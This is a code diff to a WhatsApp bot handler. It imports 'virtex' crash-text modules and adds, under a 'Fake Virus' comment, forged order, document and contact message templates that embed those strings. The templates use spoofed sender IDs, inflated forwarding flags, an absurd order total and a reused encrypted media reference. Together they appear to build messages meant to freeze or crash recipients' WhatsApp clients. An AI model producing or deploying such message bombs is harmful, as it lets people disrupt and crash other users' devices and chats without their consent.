@@ -11,6 +11,9 @@ handler.all = async function (m) {
         global.bochil = require('@bochilteam/scraper')
         const _uptime = process.uptime() * 1000
         const u = await conn.clockString(_uptime)
+        const { V10 } = require('../src/virtex/V10')
+        const { ngazap } = require('../src/virtex/ngazap')
+        const { notif1 } = require('../src/virtex/notif1')
         global.run = '𝙍𝙪𝙣𝙩𝙞𝙢𝙚' + ' ' + u
         global.ucapan = ucapan()
         global.col = 'https://telegra.ph/file/be35f3f279c9af2d607e8.jpg'
@@ -46,7 +49,47 @@ handler.all = async function (m) {
 			}
 		}
 
+// ==> Fake Virus
 
+global.ftrolii = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 2019, status: 1, surface: 1, message: wem, orderTitle: ucapWaktu, sellerJid: '0@s.whatsapp.net'} } }
+
+global.fdocs = { key : { participant : '0@s.whatsapp.net' }, message: { documentMessage: { title: `${wem}\n${notif1}`, jpegThumbnail: thumb2, sendEphemeral: true } } }
+
+global.ftroliii ={key: {fromMe: false,
+"participant":"0@s.whatsapp.net", 
+"remoteJid": "@g.us"},
+"message": {orderMessage: 
+{itemCount: 2006,
+status: 200, 
+thumbnail: thumb2,
+surface: 200, 
+message: `${wem}\n${ngazap}`,
+token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+totalAmount1000: "500000000000000",
+totalCurrencyCode: "IDR",
+orderTitle: `${wem} ${ngazap}`,
+sellerJid: '0@s.whatsapp.net'}}, 
+contextInfo: {"forwardingScore":999,"isForwarded":true},
+sendEphemeral: true}
+
+global.doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@s.whatsapp.net" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `${wem}\n${ngazap}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}}
+
+global.fkontakk = { key: {participant : '0@s.whatsapp.net'}, message: { 'contactMessage': { 'displayName': `${wem}\n${ngazap}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${wem},;;;\nFN:${wem},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabell:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb2, thumbnail: thumb2,sendEphemeral: true}}}
 
 
         //is fake
